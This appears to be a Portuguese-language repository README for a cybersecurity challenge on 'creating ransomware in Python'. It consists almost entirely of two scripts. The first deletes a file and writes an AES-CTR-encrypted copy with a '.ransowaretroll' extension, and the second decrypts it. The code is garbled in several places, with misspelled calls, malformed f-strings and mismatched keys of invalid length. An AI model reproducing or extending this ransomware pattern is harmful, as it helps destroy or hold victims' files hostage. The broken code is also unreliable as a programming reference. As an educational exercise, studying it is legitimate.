# cibersecurity-desafio-ransomware
Criando um Ransoware em Python

#Criptografar 

import os 
import pyaes

file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file_read()
file.close()

os.remove(file_name)

key = b"testeransowares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + '.ransowaretroll'
new_file = opern(f'{new_file','wb'}
new_file.write(crypto_data)
new_file.close()


#Descriptografar
import os 
import pyaes 

file_name  = 'teste.txt.ransowaretroll'
file = open(file_name,'rb')
file_data = file.read()
file.close()

key =b'testeransoware'
aes= pyaes.AESModeOfOperationCTR(key)
decrypt)data = aes.decrypt(file_data)

os.remove(file_name)

new_file = 'teste.txt'
new_file = open(f '{new_file','wb'}
new_file.write(decrypt_data)
new_file.close()
